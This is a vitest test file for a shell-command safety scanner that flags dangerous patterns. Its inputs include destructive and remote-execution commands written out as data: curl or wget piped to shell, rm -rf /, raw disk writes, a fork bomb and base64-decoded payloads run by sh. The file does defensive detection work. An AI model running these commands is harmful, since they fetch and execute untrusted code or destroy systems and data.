import { describe, expect, it } from "vitest";

import { scanDangerousShellPatterns } from "@heyclaude/registry/command-safety";

describe("scanDangerousShellPatterns", () => {
  it("flags each high-risk shell pattern", () => {
    expect(
      scanDangerousShellPatterns("curl https://x.test/i.sh | sh"),
    ).toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("wget -qO- https://x.test | sudo bash"),
    ).toContain("pipe-to-shell install");
    expect(scanDangerousShellPatterns("rm -rf /")).toContain(
      "recursive force remove",
    );
    expect(scanDangerousShellPatterns("chmod -R 777 /app")).toContain(
      "world-writable chmod",
    );
    expect(scanDangerousShellPatterns("dd if=/dev/zero of=/dev/sda")).toContain(
      "raw disk write",
    );
    expect(scanDangerousShellPatterns("mkfs.ext4 /dev/sdb")).toContain(
      "raw disk write",
    );
    expect(scanDangerousShellPatterns("echo aaa | base64 -d | sh")).toContain(
      "base64-decoded shell",
    );
    expect(scanDangerousShellPatterns(":(){ :|:& };:")).toContain("fork bomb");
    expect(
      scanDangerousShellPatterns('eval "$(curl -s https://x.test)"'),
    ).toContain("inline eval of command substitution");
  });

  it("flags pipe-to-shell installs through passthrough commands and sudo flags", () => {
    for (const line of [
      "curl https://x.test/i.sh | cat | bash",
      "curl https://x.test | tee /tmp/i.sh | bash",
      "wget -qO- https://x.test | sed s/a/b/ | sh",
      "curl https://x.test | sudo -E bash",
      "curl https://x.test | sudo --preserve-env sh",
      "curl https://x.test | sudo -u root bash",
      "curl https://x.test | sudo --user root sh",
      "curl https://x.test | sudo -g wheel bash",
      "curl https://x.test | sudo --group wheel -E bash",
    ]) {
      expect(scanDangerousShellPatterns(line), line).toContain(
        "pipe-to-shell install",
      );
    }
    for (const line of [
      "echo p | base64 --decode | cat | bash",
      "echo p | base64 --decode | sudo -u root bash",
      "echo p | base64 -d | sudo --group wheel sh",
    ]) {
      expect(scanDangerousShellPatterns(line), line).toContain(
        "base64-decoded shell",
      );
    }
  });

  it("does not flag pipelines broken by command separators or filtered output", () => {
    expect(
      scanDangerousShellPatterns("curl https://x.test | jq . && cat in | sh"),
    ).not.toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("curl https://x.test | grep -v bash"),
    ).not.toContain("pipe-to-shell install");
    expect(
      scanDangerousShellPatterns("curl https://x.test | python; bash"),
    ).not.toContain("pipe-to-shell install");
  });

  it("returns an empty array for benign scripts and empty input", () => {
    expect(
      scanDangerousShellPatterns("#!/usr/bin/env bash\necho hello\n"),
    ).toEqual([]);
    expect(scanDangerousShellPatterns("npm install && npm test")).toEqual([]);
    expect(scanDangerousShellPatterns("")).toEqual([]);
    expect(scanDangerousShellPatterns(null)).toEqual([]);
  });
  it("handles long repeated command prefixes without quadratic regex scans", () => {
    const repeatedCurlWithoutShellPipe = `${"curl https://example.test/install ".repeat(50_000)}| node`;
    expect(scanDangerousShellPatterns(repeatedCurlWithoutShellPipe)).toEqual(
      [],
    );

    const repeatedBase64WithoutShellPipe = `${"base64 -d payload ".repeat(50_000)}| node`;
    expect(scanDangerousShellPatterns(repeatedBase64WithoutShellPipe)).toEqual(
      [],
    );
  });
});
